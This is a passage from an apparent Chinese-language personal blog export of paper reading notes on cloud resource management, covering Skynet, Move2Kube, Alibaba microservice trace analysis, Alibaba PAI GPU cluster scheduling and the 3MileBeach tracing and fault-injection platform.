一个web应用PLO为1000请求/秒。Skynet给每个新应用分配一个预定义容器。在执行阶段，Skynet主要使用两个组件：Resource Estimator(RE)和Resource Assigner(RA)，来周期性的调整资源配额以满足PLO：\nSkynet周期性监控应用性能指标，如果触发PLO违规，会触发RE。 RE基于PLO调整PIDs的参数。 基于目标PLO，RE预估应用新的资源需求。 当可分配资源满足条件时，RA调整应用容器。 放置应用以及根据控制器更新应用放置 确定应用资源需求量后，Skynet决定容器的资源限额和放置。具体来说，包括容器打包，节点绑定以及资源配额。其中，容器大小和放置由于需要考虑多种资源的约束，远比打包应用复杂。放置应用的目标是：避免应用间干扰，提高应用性能表现。\n当新应用到来时，Skynet进行扫描，查看是否有某个服务节点可以单独满足应用的资源需求，如果不存在这样的服务节点，就迭代执行下列步骤：\n增加一个容器的数量； 在容器之间平均分配资源； 找到能够满足容器需求，并且负载最高的服务节点； 如果没有，循环执行上述步骤。 调整应用资源配额。每次请求改变资源需求时，有三种可能：(理解的有些别扭？)\n资源不够。该情况下，Skynet决定有没有现存的容器可以移除。然后基于节点负载对节点进行排序，移除额外的容器。 节点上的可用资源早已被分配给应用。Skynet在容器之间平均增加应用程序的资源，以匹配新的请求。 可用资源分布在不同的服务节点上。Skynet以放置新应用的思路放置新的容器。 总的说，就是处理，容器应该放置在哪个节点上的问题。算法思路如下：\n在Kubernetes上的实现 使用Golang实现自定义调度器。使用Prometheus进行监控。代码开源[11]。\n⭐我的问题 关于PID控制理论的补充 已经不止一次在论文中看到使用PID来调整资源分配了。\nhttps://zhuanlan.zhihu.com/p/39573490\n如果要使用PID算法，再细读 获得监控数据后具体怎处理？\n分配资源的具体方法？\nKonveyor Move2Kube: AutomatedReplatforming of Applications to Kubernetes ⭐摘要 文章提出Move2Kube，一个再部署框架，能够自动调整部署细节，并通过部署pipeline将非Kubernetes平台部署的应用转移到Kubernetes平台上，同时最小限度修改应用架构和实现。\n此外，文章提出\n一个最小化的中间表示，不同的应用部署构建都可以转化到这个中间表示上来。 一个扩展框架，用于添加对新的部署源平台和目标中间件的支持，同时允许定制化。 Move2Kube已经开源：https://move2kube.konveyor.io/\n要解决什么问题 在不是K8s平台部署的应用迁移到K8s平台上，同时应该最小限度的修改原系统的实现和软件架构。\n挑战、难点在哪里 应用规模：企业级应用往往有上千个组件，人工迁移费时费力； 应用异构：多样的部署平台，多样的应用架构和种类； 不同的代码源、组件仓库：代码源或者使用的组件分布在不同的仓库中，很难将其组织到一起，如何分布的数千个目录中找到正确的文件很有挑战； 容器化挑战：将应用容器化时，对于优化配置和分层安全很有必要，需要对容器内部、镜像技术和应用配置有深入的理解； 目标平台映射：找到正确的不同平台的配置映射关系是困难的，例如如何选择从简单的K8s service转换到Istio的配置中； 应用的最佳实践：K8s有最佳实践[6]，如何确保迁移使用K8s的最佳实践； 定制化的需求和有效的Day 2 Operation：针对不同应用和需求定制化的配置以适应平台特性需要一定的经验和时间，同时需要考虑Day 2 Operation。 关于什么是Day 2 Operation：https://jimmysong.io/blog/what-is-day-2-operation/\nMove2Kube 这个开源框架旨在解决应用迁移到Kubernetes平台过程中出现的上述问题。它提供了标准化的Pipeline，包括容器化、参数化、配置优化、定制化等解决方案，满足面向特定平台的多源、多服务的应用部署迁移。\n该文不太属于资源管理方面。\n","date":"2022-04-21T14:33:47+08:00","permalink":"https://lizonglingo.github.io/p/ieee-cloud-21-%E4%BA%91%E4%B8%8A%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%9B%B8%E5%85%B3%E5%90%88%E8%BE%91/","title":"IEEE CLOUD 21 云上资源管理相关合辑"},{"content":" 来源： SoCC'21\n作者： Alibaba Group\nhttp://cloud.siat.ac.cn/pdca/socc2021-AlibabaTraceAnalysis.pdf\n摘要 背景 理解微服务的特征，对利用微服务架构的特性很重要。然而，目前还没有对微服务及其相关系统在生产环境下的全面研究。\n工作 我们对阿里巴巴集群中大规模部署微服务进行了详实的分析。研究重点是描述微服务的依赖关系及其运行时性能。\n对微服务调用图进行了深入剖析，以量化它们与数据并行作业的传统DAG之间的区别 为合成更有代表性的微服务追踪轨迹，构建了数学模型去模拟调用图 结论 通过分析，发现调用图是重尾分布的\n它们的拓扑结构类似于树\n而且许多微服务都是热点(hot-spots)\n发现三类有意义的调用依赖，可以用来优化微服务的设计。\n大多数微服务对CPU受到的干扰比对内存受到的干扰更加敏感\nIntroduction 分析目标有20000个微服务，时间是7天，表征了它们的特性，包括动态的调用图，表征了微服务间调用依赖还有运行时性能分析。\n微服务调用图与传统的数据并行处理任务DAG图明显不同 虽然可以看作有向图，但是有下面几个明显的不同：\n调用图的大小遵循重尾分布，有10%的调用图包含超过40个微服务生命阶段，其他大多数只有几个阶段（因为由于服务运行时的动态性，不同时刻的调用图不同） 调用图的形状像树，大部分节点只有一条入边，与大数据任务的明显不同 存在微服务热点，5%的微服务被90%的微服务调用，而传统的DAG图中不会存在节点共享的情况 微服务在运行时有高度动态的调用关系，在极端的情况下，同一个在线服务有超过9类拓扑上不同的图 微服务的强依赖关系为优化微服务设计提供了方向 例如，优化两个强依赖关系的调用接口，提升上游、下游微服务间的通信效率，避免形成局部的性能瓶颈。\n微服务对CPU扰动比对内存扰动更加敏感 CPU扰动会严重影响到响应时间。例如，CPU利用率在10%和30%时，响应时间相差20%。\n同时，这表明需要对有效的任务调度策略有极大的需求，以平衡不同机器上CPU的利用率。\n随机模型可以很好地模拟动态微服务调用图 现有的一些调用图不能展现服务运行时的调用状态，在整个生命周期中不会跟随请求的发生而动态改变。\n为此，文章构建了一个随机模型，通过对微服务进行分类来生成调用图。\nContribution 首次对生产集群中的微服务进行详细的研究，包括微服务调用图的结构和依赖属性 对微服务运行时表现进行详细的表征，对微服务调度和资源管理给出深入的洞见 构建图模型来有效的生成大规模的微服务追踪结构，对在模拟图中表征结构性质进行了理论分析 Microservice Background And Alibaba Trace Overview 微服务架构 追踪概览 收集了超过100亿次调用的追踪。\n物理运行环境 使用Kubernetes管理裸金属云环境，依赖硬件优化加强集群性能表现，并实现不同服务间的隔离性。如下图：\n在线服务和离线服务会存在同一个裸金属节点上，以加强资源利用率 在线服务运行在容器中，直接被K8s所管理，而离线任务被分配定量的pods，交给调度器进行调度 批处理任务被放到安全容器中来保证安全性 有状态应用被部署在专门的节点上，不和其他无状态或是批处理应用共享机器 微服务系统测量 如Figure 2(b)，微服务监控对每个容器的指标进行测量，隔段时间再求均值。测量的范围从硬件层面的缓存miss率，到操作系统层面的CPU利用率还有内存使用等，还有容器应用层面的例如JVM的堆使用和垃圾回收。\n测量用Timestamp来作为时间序列的表征。\n调用图中的微服务调用指标 如Figure 2(c)：\n微服务调用通过TraceID作为请求标识，代表一个调用图 interface是上游服务和下游服务的调用接口 还记录了上下游服务Pod的IP 上下游调用的响应时间 \u0026hellip; 聚合调用 如Figure 2(d)，微服务的调用情况也会被记录：调用时间戳、响应时间、微服务、调用和被调用的接口、上下游微服务。\n解析调用图 微服务调用图的特性 **微服务调用图的数量呈现重尾分布。**大多数调用图只包含少数微服务，调用层级不超过3层。但有的调用图包含大量的微服务和很深的层次，如下图：\n图中的微服务数量呈现Burr分布 超过10%的服务包含超过40个不同的微服务 超过40个微服务的大型应用中，大约有50%的微服务是缓存服务（因为系统越庞大，需要缓存来加快系统响应时间，使用缓存比数据库有更高的效率） 下图是调用图深度的分布：\n平均深度为4.27层 深度在3层的服务居多 仍有超过4%的调用图超过10层 所带来的问题是，如何使用深度学习方法，为这些服务分配正确的容器数量，如[17, 40]。这些方法将不同层次的微服务进行编码，并将实时的资源分配作为神经网络的输入向量。但是这样很容易产生过拟合现象，调用图规模太大，而用于调整模型的负标签太少，如RT violation现象。\n因此，急需找到合适的方法有效的为大规模微服务分配资源。\n微服务调用图像一棵树，许多图包含一条较长的链。如下图：\n当微服务数量不断增加，调用深度逐渐稳定 如果一个微服务调用涉及到有状态服务，那么一般来说这条调用链不会再延长，终止于有状态服务 关于调用图节点的出边和入边分布如下图：\n超过10%的有状态服务至少有5条出边 大多数微服务只有一条入边 一旦微服务层数大于2时，相关层包含的微服务一般只有一个，如下图：\n例如，当层数在10层时，有超过50%的情况是这层只有一个微服务。也就是上面提到的，为什么深度越深，就越是表现出链式结构。此外，这种情况也利于查找微服务调用中出现的瓶颈。\n无状态服务容易成为hot-spots。如上面的Figure 4所示，超过5%的微服务在聚合调用后有超过16条入边，这些超级微服务承载力将近90%的调用，涉及到95%的调用。因此这种松耦合架构展现了严重的负载不平衡。这有利于资源扩展，因为系统管理员应该只关注单个微服务的扩展，并为这些超级微服务分配更多的容器。\n**微服务调用图有很高的动态性。**即使是同一个在线应用，它们生成的调用拓扑图都有显著的差异。例如同一个付款请求，一个有优惠券的用户和一个会员用户或者一个普通用户，请求的调用的微服务都有显著的不同。如下图，所有在线服务都至少有两类图拓扑结构：\n另外，还有超过10%的微服务呈现9中调用模式。**这进一步给基于图的微服务预测任务带来了巨大的挑战。**现有的基于CNN的微服务资源管理方法不能描述这些动态特性，也不适用于实际的工业应用。\n图学习算法 该算法的目的在于：将调用图中的微服务进行分类。关键点是将每个微服务转换为一个向量。如InfoGraph算法，这是无监督学习，它将节点信息（如某种微服务），还有边信息（如微服务的调用关系），做成邻接矩阵作为深度神经网络的输入。\n通过综合训练集的信息，InfoGraph可以为每个图生成一个嵌入向量。\n文章分别训练每个在线服务，并在嵌入的20维向量上使用K-means聚类，将该服务生成的所有调用图分组为多个类。聚类的数量在[2,10]中，并用来生成平均轮廓系数。\n在聚类后，使用通用方法Graph Kernel，用来生成两个图间的相似度。\n对图进行聚类和相似判断的算法如下：\n详细分析 无状态微服务的调用模式在不同的层上有很大的不同 通常无状态服务没有下游微服务，调用图一般不会在无状态服务处继续扩展 消息队列对减少深层次的调用图的端到端时延很有帮助 对于依赖缓存的服务，当缓存未命中时，会花费大量时间调用数据库服务 当深度增加时，无状态微服务和数据库(即S2D)之间的通信百分比呈亚线性增长 下图中：\n图a展示不同类型的无状态服务对调用层数的影响 图b展示了随着深度增加，服务间通信类型，请求类型的占比 无状态服务间依赖 上文中提到，无状态服务过多依赖其他的存储服务，一些时候不可避免的带来服务资源占用。通过研究无状态服务间依赖以避免通信过载和死锁的发生。\n循环依赖关系 下图为循环依赖关系的简单实例：\n这种依赖分为：强依赖关系和弱依赖关系。强循环依赖如果设计不合理，会导致死锁。\n强循环依赖关系：上游的输入接口与下游的应答接口相同，直接的就是I1=I3 弱循环依赖关系：I1 != I3 循环依赖关系在调用图同不可忽视 下图展示循环依赖的占比以及这些依赖使用的通信方式：\n大多数通信模式使用RPC进行 在所有的循环依赖中，2.7%是强依赖关系 耦合依赖：高频率的调用次数和长调用时间 对于调用率和调用次数的计算如下：\nCount(X)：上游Y调用下游M的次数（相邻两层中，X可能会被Y多次调用）\nSum：表示所有调用图中由Y触发的两层调用的数量\nN：为两层调用中X被调用的数量\n如果Call Probability和Call Time的值超过2和0.9，就说这两个服务是耦合依赖的。\n对于有强耦合依赖的服务，可以将它们的接口做到一起以优化，减轻网络拥塞。\n并行依赖 并行依赖可以减轻上游服务的响应时间。但是在这种情况下建议将服务做进一个微服务中。\n微服务运行时表现 理解微服务运行时的情况有利于保证服务质量。在本节中，文章研究图拓扑和资源干扰以及微服务调用率(MCR)对响应时间的影响。\n微服务调用率 MCR记录了每个容器每分钟接收调用的次数。如果MCR过大，可能意味着资源紧张。\n使用Spearman相关系数来评估MCR序列和微服务容器运行时的序列。如下图：\n上图展示了MCR和多种不同的系统层面和应用层面的资源调用的累积分布。\n微服务调用率与CPU利用率和Young GC高度相关，但与内存利用率无关 说明CPU利用率和Young GCs最能反应资源紧张程度 微服务响应时间表现 本部分研究调用图的复杂性、资源竞争和MCR以及其他因素对微服务响应时间表现的影响。\n端到端时延在拓扑结构类似的调用图中较为稳定，而在拓扑结构不同的调用图中显得很大不同。\n通过上面的图聚类算法将调用图进行分类，对每类图中的响应时间进行计算。这进一步说明图拓扑结构对端到端RT有很大的影响。此外，文章设计的图学习算法可以用于预测RT性能。\n端到端性能会由于CPU的高占用而下降。\n**在微服务调用率变化时，时延并没有太大波动，**这是由于在集群中及时处理了调用请求避免消息堆积。\n用概率模型生成微服务图 涉及到的算法暂时没看太懂\u0026hellip;\n相关工作 Microservice benchmarks Serverless benchmarks Cloud workloads Cloud trace analysis Performance characterization of online services ","date":"2022-03-29T13:40:56+08:00","permalink":"https://lizonglingo.github.io/p/characterizing-microservice-dependency-and-performance-alibaba-trace-analysis/","title":"Characterizing microservice dependency and performance: Alibaba trace analysis"},{"content":" 来源： NSDI'22\n作者：Alibaba Group\n摘要 在ML as a Service中，数据中心为ML提供算力保证。而多样的ML工作负载面对异构GPU集群时会出现一些问题。通过两个月的数据收集，采集了超过6000个GPU的生产数据。并发现集群调度面临的一些问题：\n低GPU利用率 长队列延迟 需要高端GPU的任务调度难度大 异构机器负载不均衡 CPU潜在的瓶颈问题 文章对上述问题提供了一些解决方案。\n本文的最大贡献是提供了一个真实的大规模生产级别的ML集群的追踪数据，并在此基础之上进行分析，为ML as a Service - 云环境下的ML工作负载调度提供了重要的一手数据。\nIntroduction 在ML框架下的任务需要不同的调度策略，例如GPU局部性、群调度，而且需要调配跨数量级的资源。同时集群中的机器是异构的，一些配置如下图：\n而异构的运行环境给资源管理和调度带来新的困难。\nGPU碎片化使用带来的低利用率 例如一个任务实例只使用GPU资源的一部分。流处理程序的GPU利用率的中位数值只有0.042GPU。粗粒度的GPU分配使得资源使用率低下。\n为解决这个问题，文章提出了GPU sharing，一种可以以时分复用的方式让多个任务共享GPU的控制方式。使用该方式，将许多低GPU的工作负载整合起来，使用一个GPU，提高资源使用效率。此外，这种共享方式不会引起资源争用干扰，资源竞争的概率十分小。\n短任务面临的长排队延迟 短时间运行的任务实例容易由于队列头阻塞而导致长队列延迟，大约9%的任务排队等待的时间超过他们的执行时间。\n一种有效的解决方案是预测任务运行时间，并将短任务优先级尽可能提高，避免与长任务竞争。通过仔细的特征工程，我们可以预测大多数重复任务的持续时间，误差在25%以内，这足以根据之前的工作建议做出质量调度决策（因为，通过观察，集群中有65%的任务有重复的工作负载）。跟踪驱动的仿真结果表明，通过预测任务持续时间采用最短作业优先调度，平均完成时间减少63%以上。\n高GPU使用的作业难以进行调度 集群中的一些任务要求无共享的使用GPU，以利用高级硬件特性，达到加速训练的目的，如NVLink[12]，因此，对这些任务难以进行调度。\n集群中的调度器使用一个简单的 reserving-and-packing 策略在集群中分辨出这样的任务。它保留高端的GPU机器，如，V100 with NVLinks，用于少数具有挑剔调度要求的高GPU任务，同时将其他工作负载打包到不太高级的机器上，使用GPU共享策略保证资源的利用率。此外，该策略还提升了平均队列等待延迟，加快了任务调度。\n负载不均衡 明显的是，低端GPU比高端GPU更加拥挤，前者被分配了70%的GPU和CPU资源，而后者只被分配35%的CPU和49%的GPU资源。\n工作负载和机器之间也存在供应不匹配的问题。例如，工作在8GPU的工作负载对CPU的需求是那些可以提供12GPU的1.9倍，简而言之就是，那些性能更弱的机器被分配了与其能力不匹配的工作负载。\nCPU瓶颈 一些机器学习、深度学习作业不仅仅需要GPU，有的也需要CPU资源，这造成CPU瓶颈。同时发现， 工作在高CPU利用率机器上的任务容易减速。\n工作负载特征分析 追踪概述 关于数据集的数据内容和下载请查看clusterdata。实际上并不能明确的知道容器里执行的到底是什么类型的训练任务，但是可以从作业名中得到一些线索。\n下图为PAI和Trace的架构：\nJobs, tasks, and instances 用户提交jobs，一个job有一个或多个tasks来扮演不同的计算角色，每个task使用Docker运行一个或多个instances。\n例如，一个分布式训练job有一个参数服务task，该task有两个实例，此外还有一个worker task有10个实例。一个task的所有instances有相同的资源需求，并且需要gang-schedule。\n我们主要关注任务实例，也就是instance这一级别的工作。\nHeavy-skewed instance distribution PAI追踪了120万个tasks，超过750万个instances，由超过1300个用户提交。下图展示了用户提交的task instance的分布，表现出严重的不平衡：\n5%的用户提交了大概77%的task instances，大概每个用户运行1.75万instance。而50%的用户每人运行少于180个instances。\nThe prevalence of gang-scheduling 分布式的任务需要gang-schedule（认为超过2个GPU的调度），如下图：\n大约85%的任务需要这样的需求，有20%的任务需要超过100个GPU的调度，还有的甚至要进行超过1000个GPU的调度。\nGPU locality 除了gang-schedule，一个任务可能会在同一台机器上的多个GPU上运行它的所有实例，也就是存在GPU局部性。\n虽然这种情况会引发调度延迟的加剧（一些任务等待调度的时间延长），但是在单节点的GPU上进行训练减少了GPU to GPU的通信时间。\n但是通过增强GPU局部性，可以让某些任务的训练速度加快10倍。\nGPU sharing GPU sharing利用时分复用的原理使得多用户可共享一个GPU进行训练。\nVarious GPU types to choose from PAI提供异构的GPU可供任务选择。在集群中只有6%的训练任务需要运行在特定的GPU上，其他的任务则对GPU类型没有限制。\n时间模型 从时间角度来观察PAI工作负载。\nDiurnal task submissions and resource requests 下图是一周中task和instance的提交情况，还有总体的资源请求情况：\n从中可以得到以下几点信息：\n周中提交数量多余周末 夜晚也有任务提交的高峰 大多数在夜间提交的任务并非计算密集型 Instance run-time in a wide range 下图展示了instance运行时间的分布：\n运行时间的变化范围很大，有4个数量级 Non-uniform queueing delays 理解为在队列中等待调度的时间。这段时间指task提交到instance执行的时间，如下图：\n对比long-task，short-task通常花费更多比例的时间在等待调度上 大约9%的短作业实例花费超过完成时间的一半去等待调度，而长左右这个数值只有3% 此外，task instance的队列延迟还取决于GPU的需求，如下图：\n那些可以共享GPU的instance（GPU需求为0-1）可以更快的被调度，其等待调度的等待时间P90值为497s 而不支持共享GPU的任务的这一值为1150 同时，长队列等待时间也出现在一些需要高端GPU的任务中，如下图：\n例如在V100和V100M32上的instance需要更多等待时间 空间模型 通过分析资源请求和使用，分析了PAI task instance的空间模型。每15s进行一次测量，并使用虚拟化工具[2, 25]去分析用户的负载模式和他们的资源需求。\nHeavy-tailed distribution of resource requests 如下图：\n图5(a)(b)(c)中的蓝色实现表示，大约20%的实例占用了80%的资源，而其余的只要很少一部分资源\n以P95和中位数比较，P95需要12vCPU、1GPU、59GB内存，而中位数只要6vCPU、0.5GPU和29GB内存。\nUneven resource usage: Low on GPU but high on CPU 集群中instance的资源使用中位数在1.4vCPU、0.042GPU和3.5GB内存，远小于资源请求的中位数。\n观察到存在GPU空闲和CPU不够用的情况，并推断GPU的低利用率不是因为对GPU的需求少，而是CPU瓶颈限制了GPU的使用\n从5(b)中也可以看到，对GPU的实际使用远小于GPU资源的需求\n从5(d)中，对应X坐标\u0026gt;1的值表示CPU的使用量大于申请的量，有19%的instance出现这种情况，而超量使用GPU的只有约3%的实例，对内存来说这一值也只有9%\nGPU利用率 计算资源利用率 包括CPU、GPU和Memory。监控系统每15s收集数据，并存到时间序列数据库中。\n如下图：\n相比内存来说，GPU和CPU利用率普遍高，也说明大部分任务不是内存集中型 GPU利用率的P90跨度很广，这与GPU使用有突发性相关，同时也与调度策略有关 网络和I/O的低利用率 网络中数据接收量普遍较低 网络带宽普遍不能达到指定数值(如不能达到保证的10Gbps、32Gbps) iowait模式比usr和kernel模式少三个数量级，这意味着CPU大多数时间在进行计算而不是在等待I/O 优化集群管理的方向 在PAI中，集群管理有两个优化目标：\n实现GPU的高利用率 缩短task的运行时间 GPU共享 与CPU不同，GPU天生就没有共享特性。PAI以时分复用和空分复用（内存）方式，使多个任务实例可以共享一个GPU。\nBenefits of GPU sharing 下图将是否使用GPU sharing的表现进行对比：\n平均而言，共享只需要50%的GPU资源，可节省高达73%的费用，节省大量的GPU资源 Does GPU sharing cause contention? 随着利用率的增加，运行在共享GPU上的实例开始争夺资源。\n由于大多数高利用率的GPU上面运行单个实例(平均4.5%的GPU运行多个实例)，因此不会发生争用，所以认为GPU共享不会在集群中引起严重的争用 预测重复任务的持续时间 文章认为预测ML认为实例的运行时间是实现更好调度的关键。现存的预测方案基于迭代次数、损耗曲线、目标精度和训练速度等指标。\nThe prevalence of recurring tasks 文章发现大多数任务都是重复的，并且它们的实例运行时可以很好地从过去的执行中预测出来。通过对任务的元数据，如：脚本、命令行参数、数据源和输出，进行hash得到Group tag来标识重复的任务。\n约65%的任务在trace中至少运行5轮 大多数重复任务每个周期都有相似的运行时间 Instance duration prediction for recurring tasks 实际的预测使用三个特征作为输入：\ntask\u0026rsquo;s username - User resource request - Resource including GPU and other resources group tag - Group 利用上述特征，基于CART(Classification And Regression Tress)算法预测实例的平均运行时间。作为评估，使用至少重复5轮的任务，下图为预测详情：\n从上图得知：\nGroup是重要指标 Benefits for scheduling 上图展示不同调度方法。\nSJF-Oracle明显好于其他算法，该算法基于真实的任务持续时间和预测算法 给的特征越多，效果越好 调度面临的挑战 本部分使用两个案例：典型的ML tasks，分别有高/低GPU资源需求的特性。\n高GPU需求任务的研究 集群中一些任务有计算密集型实例，需要很高的GPU资源。\nNLP with advanced language models NLP任务中，73%的有大规模的输入，需要16GB或更高的内存。下图展示了NLP实例对GPU资源的需求和使用情况：\n约40%的实例需要超过1个GPU，超过那些常规的任务 Image classification with massive output 集群中还有些任务需要GPU to GPU的高效率通信，GPU局部性可以提高通信效率。典型代表就是图像分类模型，其中存在规模庞大的全连接层，要求在工作实例之间进行大量的梯度更新，需要使用大量的通信资源，使通信成为瓶颈。\n如图14(b)中，启用NVLink极大缩短了任务的运行时间。\n低GPU需求的任务研究 使用三种广泛使用的任务进行研究。一些CPU密集型的任务可能会导致GPU的利用率低下。\nCTR prediction model training and inference 在追踪中，有6.7%的广告点击率预测系统（ advertisement click- through rate (CTR) prediction）使用了CTR模型。其中有25%的实例负责训练，75%的实例负责推理工作。这些实例的CPU和GPU资源分布如下：\n与训练相比，执行推理任务的实例具有更高的CPU利用率，因为它们处理源源不断到达的大量数据 有近75%的实例使用的GPU小于0.1 下图展示了这些模型运行时资源情况：\nCPU资源的使用明显高于其他资源 GNN training 图神经网络也是计算密集型任务， CPU的使用率远超GPU，如下图所示：\n在模型训练阶段，需要进行大量的CPU操作 Reinforcement learning 加强学习算法通过并行模拟迭代生成一批数据将生成的数据放到GPU上进行训练，以改进学习策略。\n有72%的任务需要超过10个实例来完成，加大调度难度 但是大多数RL任务对GPU的需求极低 部署调度策略 Reserving-and-packing 集群中有意保留高端GPU资源，而尽可能将任务打包在一起，共享使用低端GPU资源。\n对于每个任务，调度程序生成一个有序的分配计划序列；每个计划指定了预期的GPU设备，并与尝试超时值相关联。\n对于需要高端GPU的任务，先尝试高端GPU的分配，然后再尝试较低端GPU的分配；对于其他任务，顺序颠倒过来，GPU调度器是在基于局部树的调度系统Fuxi[26,71]上实现的。\nLoad-balancing 在Reserving-and-packing的前提下，调度器还会优先将实例调度到分配率较低的机器上，分配率衡量为已分配的CPU、内存和GPU的加权总和，这些资源按机器的容量进行标准化。\nBenefits 具体对应两种调度方法：\n简单地使用渐进式填充的负载平衡机器(总是将任务的实例调度到利用率最低的节点) 不考虑负载均衡，只执行Reserving-and-packing 下图展示了这两种策略的实际表现：\n请注意，任务的排队延迟也包括在它的组调度实例的排队延迟\n在这两个策略下，超过90%的实例和任务会立即启动\n与负载均衡算法相比，Reserving-and-packing算法将平均任务排队率降低了45%，主要原因是尾部延迟的显著缩短超过10000秒\n进一步比较了业务关键型任务和请求V100的实例的排队延迟，在两种策略下，GPU的平均任务排队延迟减少了68%\n其他待解决的问题 Mismatch between machine specs and instance requests 该问题带来的影响如下图：\n这直接导致：相较于高端机器来说，低端机器明显更拥挤，它们的资源使用率也高于高端机器 Overcrowded weak-GPU machines Imbalanced load in high-end machines CPU can be the bottleneck ","date":"2022-03-21T21:05:51+08:00","permalink":"https://lizonglingo.github.io/p/mlaas-in-the-wild-workload-analysis-and-scheduling-in-large-scale-heterogeneous-gpu-clusters/","title":"MLaaS in the Wild: Workload Analysis and Scheduling in Large-Scale Heterogeneous GPU Clusters"},{"content":" 来源：ACM SoCC'21\n作者：UC Santa Cruz\n摘要 提出3MileBeach，一个针对微服务架构的追踪和故障注入平台。 通过介入一个消息序列化库，避免了代码层面的监控（这是传统的追踪和故障注入会做的），可以提供更细粒度的追踪和故障注入。 3MileBeach提供了一个消息级别的分布式追踪，其开销只有最先进追踪框架的一半；提供故障注入比现有方案有更高的精度。 使用3MileBeach进行一种新型故障注入Temporal Fault Injection（TFI）。 追踪和故障注入现存的问题 运行时开销和工作量过大； 对异构应用程序和基础代码，基础设置的入侵性改动； 微服务组件以不同的语言进行设计，之间使用不同的通信机制； 故障注入需要在精度、粒度和成本上进行取舍。 3MileBeach的能力 其只需要应用程序级的插件就能实现功能； 提供细粒度的追踪，比最先进的技术节省25%~50%的成本； 提供丰富且严格的跟踪指标； 支持大规模并发故障注入，适用于生产环境； 实现新型故障注入模式TFI，这基于时序谓词（nlp中的技术），可以识别可能处于休眠状态中的技术。 Motivation 目前最先进的分布式系统故障注入存在两个基础的问题：\n存在对细粒度、并发测试、不受blast radius影响的需求； 现有的故障注入技术没有足够的表现力。 Time of Check to Time of User(TOCTTOU error) 假设一个在线购物平台存在如下问题，用户准备为购物车的物品付款时调用前端：\n前端发送一条消息给信用卡服务来验证（一个下游服务用来验证用户信用卡信息）； 如果验证成功，前端会发送信息给商品服务来计算费用； 计算完成后再次调用信用服务，扣除费用。 试想这种情况：第一次调用信用卡服务成功，通过验证，而第二次（提出扣费申请时）发送了一个错误请求。\n简单来说，同一个服务在一小段时间后从可用状态变为不可用。\nTemporal Discretization 大多数故障注入工具没有考虑到时间维度上的故障。\n首先，时间是一个连续的概念，往往考虑在请求的生命周期里发生故障，而忽略在发送请求时刻、流传输中发生故障；在一个确定时间引入故障或许没有什么意义。\n以上述案例为例，将前端服务视为黑盒，可以观察到信用卡服务可能不可用的四个离散的逻辑时间：\n在前端的第一次请求到来之前； 在前端第一次请求到来之后，信用卡服务返回响应之前； 在信用卡服务返回第一次响应之后，和前端请求第二次到来之前； 在前端第二次请求到来之后，信用卡服务返回第二次响应之前。 如果以粗粒度来看，前端调用信用卡服务发生的错误实际上又可以分为粒度更小的四种导致错误的原因。\nCommunication is The Thing 3MileBeach为能够达成细粒度故障注入，从消息序列化、反序列化入手。例如从gRPC请求转换为HTTP请求，存在Protocol Buffer到JSON的序列化和反序列化过程。在该过程中添加元数据来装饰消息，以跟踪每个消息的上下文。\n因为远程服务的故障总是表现为服务边界出现的延迟、报错等错误。通过错误处理，避免引发blast radius，从而可以实现并发测试。\n通过对第三方库的修改（增加请求和响应消息的上下文传播），来对事件进行持续跟踪，记录完整的服务调用历程。\n通过故障注入逻辑检查这些数据，就可以得知以下信息：\n错误来自哪一个请求？which 当前是哪一个服务遇到了错误？where 注入的是什么服务？how 故障何时被注入？when 实现 架构抽象 下图定义了边界组件模型，即微服务框架和服务处理程序之间的边界。\n大多数微服务框架都提供了服务处理handler和边界组件的交互方式。\nPanorama [40] 通过将可观察性抽象为直接调用处理程序函数的方向和以（输入/输出）队列/代理作为缓存层的异步调用处理程序函数的间接性，引入了组件交互的四种设计模式。\nFull direction。所有的函数被分配到一个线程，在该线程中依次调用入站操作、处理请求、出站操作。 Inbound indirection。在被工作线程选择之前，将入站消息存到队列中，当出站组件调用时，被唤醒执行。 Outbound indirection。入站组件和服务handler直接在一个工作线程中调用，处理后将消息放到出站线程队列等待被网络运输。 Full indirection。将入站和出站的消息都放入队列进行调度，中间通过服务handler和网络请求唤醒调用。 第2，3，4种做法都实现了上下文传播机制，可以通过handler和边界组件传递身份信息。\n因此3MileBeach选择上述的上下文传播的设计模式。\n入站组件对从网络来的row message进行反序列化，调用service handler。出站组件将处理后的message进行序列化。\n对数据流进行两种抽象：\nDirect Response Circle（DRC）； Synchronized Request-Response Circle（SRC）。 数据结构 将负载命名为3mb-payload，具体实现称为Trace。Trace是一个高层数据结构，由以下三部分组成：\n一系列的事件（Event-s）； 必要的追踪元数据（如ID），来帮助3MileBeach为追踪识别和组装事件； 一个故障注入配置列表（fault injection configuration-s，FIC-s） Event Event记录了一个事件的必要信息，从中可以知道在什么时候那哪个服务接收或者发送了一个请求或一个响应，并且具体的服务名字。\nTimestamp Service Action MessageType Name UUID \u0026hellip; 如下图所示，有4个事件联系到同一个UUID，指明一个SRC。\n其中两个由Svc1记录，一个是在Svc1发送请求时记录的，另一个是在Svc1接收响应时记录的。\nFault Injection Configuration 使用FIC来描述一个TFI和RLFI（Request Level Fault Injection）测试案例。\n考虑一个应用由n个服务组成。RLFI在客户端级请求生命周期中将故障注入服务。我们使用FIC{Type: Crash, Name: Svc_i}来表示服务i的故障。为测试所有的崩溃模式，RLFI的实验空间有$2^n$个。但是在模拟客户端级别的请求时，不需要调用全部的微服务。例如有m个服务不会被调用，实际上只需要调用$2^{n-m}$个案例。\n在TFI中，根据逻辑时序在某个测试的执行期间模拟故障。文章使用After，这是一个TFIMetas列表，用此存储故障的临时先决条件。TFI 可以触发的故障空间是RLFI故障空间的超集，因为当After为空时，RLFI是TFI的特例。\n另外通过时间离散化，FIC可以大大减少TFI的测试空间。\n如上图 ，Svc1在处理客户端请求时，从Svc0处接收到Req1和Req2。RLFI只判断这两个请是成功还是失败。如果希望Req2失败而不影响Req1，我们模拟的错误应发生在t1-t2时，而在t3之后结束。\n而TFI通过模拟崩溃时间来缩减故障的注入时间段，即在t1-t2之间注入故障，使用如下FIC来描述：FIC{Type: Crash, Name: Req2, After: [TFIMeta{Name: Req1, Times:1}]}。\n算法 本部分主要讲如何通过序列化3mb-payload来接入边界组件，以及重写序列化函数在数据流中的作用。\nInterpose via Serialization Functions 为追踪处理客户端请求的服务，3MileBeach扩展了序列化函数，叫做Deserialize’ 